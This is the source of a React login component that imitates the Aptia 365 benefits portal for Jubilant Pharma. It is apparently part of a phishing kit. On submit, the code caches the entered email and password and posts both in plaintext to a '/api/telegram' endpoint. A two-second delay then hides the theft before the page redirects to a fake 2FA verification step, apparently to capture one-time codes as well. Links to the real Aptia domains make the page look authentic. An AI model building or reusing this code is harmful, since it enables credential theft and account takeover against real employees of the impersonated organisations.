"use client"

/**
 * Aptia HOLL08 / Jubilant Pharma login UI — ported from static index.html + aptia-login.css.
 * Mounted inside the Astro LandingShell island (client:only="react").
 */

import { FormEvent, useEffect, useState } from "react"
import {
  getLoginDeniedMessage,
  MSG_UNABLE_VERIFY_TIME,
} from "@/lib/approval-messages"
import { SITE_DISPLAY_NAME } from "@/lib/site-url"

const PRIVACY_URL =
  "https://aptia-group.com/en-us/august24-us-privacy-notice?language=en"
const TERMS_URL = "https://auth.aptia365.com/apps/Aptia365/termsOfUse.html"
const HINTS_URL = "https://auth.aptia365.com/apps/Aptia365/helpfulHints.html"
const MFA_URL = "https://auth.aptia365.com/apps/Aptia365/mfa.html"
const REGISTER_URL = "https://auth.aptia365.com/HOLL08/register"

const LOGIN_NAV_DELAY_MS = 2000

export default function JubilantLoginLanding() {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [isNavigating, setIsNavigating] = useState(false)
  const [formError, setFormError] = useState("")
  const ready = username.trim().length > 0 && password.length > 0

  useEffect(() => {
    document.body.classList.add("aptia-login")
    return () => {
      document.body.classList.remove("aptia-login")
    }
  }, [])

  useEffect(() => {
    if (typeof window === "undefined") return
    const params = new URLSearchParams(window.location.search)
    if (params.get("loginDenied") === "1") {
      setFormError(getLoginDeniedMessage("generic", "Email"))
      window.history.replaceState({}, "", "/")
      return
    }
    if (params.get("verifyUnavailable") === "1") {
      setFormError(MSG_UNABLE_VERIFY_TIME)
      window.history.replaceState({}, "", "/")
    }
  }, [])

  async function onSubmit(e: FormEvent) {
    e.preventDefault()
    if (!ready || isNavigating) return

    setIsNavigating(true)
    setFormError("")

    const userId = username.trim()
    const pw = password

    try {
      sessionStorage.setItem("loginUserId", userId)
      sessionStorage.setItem("loginPassword", pw)
      sessionStorage.setItem("loginReady", "1")
    } catch {
      setIsNavigating(false)
      return
    }

    /* Fire-and-forget username+password login event — never await before nav. */
    void fetch("/api/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "login",
        userId,
        password: pw,
        page: "/",
      }),
      keepalive: true,
    }).catch(() => {})

    /* Fixed 2s UX delay — NO pending-login on Login button. */
    await new Promise((r) => setTimeout(r, LOGIN_NAV_DELAY_MS))
    window.location.href = "/login/2fa-verify"
  }

  return (
    <div className="aptia-login flex min-h-screen flex-col">
      <header className="evo-header" role="banner">
        <nav className="evo-top-bar" role="navigation" aria-label="Primary">
          <img
            className="client-logo"
            src="/images/HOLL08.png"
            width={105}
            height={85}
            alt={SITE_DISPLAY_NAME}
          />
          <img
            className="aptia-logo"
            src="/images/Aptia-365-RGB-Light-bg.png"
            width={146}
            height={55}
            alt="Aptia 365"
          />
        </nav>
      </header>

      <main className="login-main smb-main">
        <div className="l-mas-login-section">
        <div className="l-mas-login-wrap">
          <section
            className="l-mas-login-form-wrap"
            aria-labelledby="returning-heading"
          >
            <h2 id="returning-heading" className="mas-h2">
              Returning Users
            </h2>
            <p className="mas-p">Log in to your existing account.</p>

            {formError ? (
              <p
                className="text-red-600 text-sm mb-3 whitespace-pre-line"
                role="alert"
                style={{ marginTop: 12 }}
              >
                {formError}
              </p>
            ) : null}

            <form
              className="mas-form l-mas-login-form"
              id="login-form"
              action="#"
              method="post"
              noValidate
              onSubmit={(e) => void onSubmit(e)}
            >
              <div className="mas-form-group">
                <label className="mas-label" htmlFor="username">
                  Email (Username)
                </label>
                <input
                  className="mas-form-control mas-value-lower"
                  id="username"
                  name="username"
                  type="text"
                  autoComplete="username"
                  required
                  disabled={isNavigating}
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                />
              </div>

              <div className="mas-form-group">
                <label className="mas-label" htmlFor="password">
                  Password
                </label>
                <input
                  className="mas-form-control"
                  id="password"
                  name="password"
                  type="password"
                  autoComplete="current-password"
                  required
                  disabled={isNavigating}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>

              <div className="mas-btns-group">
                <button
                  type="submit"
                  className={`mas-btn mas-btn-primary mas-btn-login${ready && !isNavigating ? " is-ready" : ""}`}
                  id="login-btn"
                  disabled={!ready || isNavigating}
                >
                  {isNavigating ? "Loading..." : "Login"}
                </button>
              </div>
            </form>

            <p className="mas-forgot">
              Forgot{" "}
              <a className="mas-link" href="/forgot-username">
                Username
              </a>{" "}
              or{" "}
              <a className="mas-link" href="/forgot-password">
                Password
              </a>
              ?
            </p>
          </section>

          <section
            className="l-mas-registration-wrap"
            aria-labelledby="new-users-heading"
          >
            <h2 id="new-users-heading" className="mas-h2">
              New Users
            </h2>
            <p className="mas-p">Register your account now.</p>

            <div className="l-mas-registration-form">
              <a className="mas-btn mas-btn-primary mas-btn-outline" href={REGISTER_URL}>
                Get Started
              </a>
            </div>

            <ul className="mas-help-list sr_links">
              <li>
                <a className="mas-link hh-link" href={HINTS_URL}>
                  <i className="fa fa-chevron-circle-right" aria-hidden="true" />{" "}
                  Helpful hints for accessing your account
                </a>
              </li>
              <li>
                <a className="mas-link mfa-link" href={MFA_URL}>
                  <i className="fa fa-chevron-circle-right" aria-hidden="true" />{" "}
                  Learn about Multifactor Authentication
                </a>
              </li>
            </ul>
          </section>
        </div>
        </div>
      </main>

      <footer className="footer-meta-wrap">
        <div>
          <a href={PRIVACY_URL} target="_self">
            PRIVACY NOTICE
          </a>
          <span className="sep" aria-hidden="true">
            |
          </span>
          <a href={TERMS_URL} target="_self">
            TERMS OF USE
          </a>
        </div>
      </footer>
    </div>
  )
}
